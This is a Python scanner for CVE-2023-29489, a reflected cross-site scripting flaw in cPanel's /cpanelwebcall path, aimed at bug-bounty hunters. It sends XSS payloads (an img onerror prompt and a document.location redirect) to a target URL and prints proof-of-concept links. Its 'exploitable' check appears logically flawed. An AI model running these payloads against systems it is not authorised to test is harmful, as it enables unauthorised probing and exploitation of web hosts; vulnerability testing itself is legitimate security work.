#!/usr/bin/env python3


"""
 * cpanel_xss_2023
 * CVE-2023-29489 Bug scanner for WebPentesters and Bugbounty Hunters
 *
 * Developed By mdaseem03 
 * Intern
 * Cappricio Securities <https://cappriciosec.com>
 */
 
"""
import sys
import os
sys.path.append(os.path.join(os.path.expanduser("~"), ".local/lib/python3.11/site-packages/cpanel_xss_2023/"))
import requests
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import quote,urlparse
from . import writefile
from utils import const
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from utils import const
from utils import configure
from . import bot


endpoint = "/cpanelwebcall/<img src=x onerror=\"prompt('hacked')\">aaa"
xss = "<img src=x onerror=\"prompt('hacked')\">aaa"


def cvescan(url, output):
    try:
        with requests.Session() as session:
            
        
            encode = quote(endpoint)
            fullurl = f'{url}/{encode}'
            
            try:
                response = requests.get(fullurl)
                print(f'testing ===> {fullurl}')
                if (response.status_code == 400) and (xss in response.text):
                    outputprint = (
                                f"\n{const.Colors.RED}💸[Vulnerable]{const.Colors.RESET} ======> "
                                f"{const.Colors.BLUE}{url}{const.Colors.RESET} \n"
                                f"{const.Colors.MAGENTA}📸PoC-Url->{const.Colors.BLUE}${const.Colors.RESET} {fullurl}\n\n\n"
                            )
                    
                    print(outputprint)
                    exploit = "/cpanelwebcall/%3Cimg"+"%20"+"src=x"+"%20"+"onerror="+"%22"+"document.location="+"%27"+"https://google.com"+"%27%22%3E"
                    
                    url_exploit = f'{url}/{exploit}'
                    
                    response_exploit = requests.get(url_exploit)
                    
                    if not(response_exploit.status_code > 300) or (response_exploit.status_code < 400): 
                        print(f"\n{const.Colors.RED}⚠️ OOPS! XSS Exploitable {const.Colors.RESET}")
                        print(f"{const.Colors.MAGENTA}📸PoC-Url->{const.Colors.BLUE}${const.Colors.RESET} {url}/{exploit}")
                    else:
                        print(f"\n{const.Colors.GREEN}😌 Not Exploitable{const.Colors.RESET}")
                    if configure.check_id() == "Exist":
                        bot.sendmessage(fullurl)
                    if output is not None:
                        writefile.writedata(
                            output, str(f'{fullurl}\n'))
                        

                
            except requests.exceptions.RequestException as e:
                print(
                    f'{const.Colors.MAGENTA}Invalid Domain ->{const.Colors.BLUE}${const.Colors.RESET} {fullurl}: {e}')
    except requests.exceptions.RequestException as e:
        print(f"Check Network Connection: {e}")



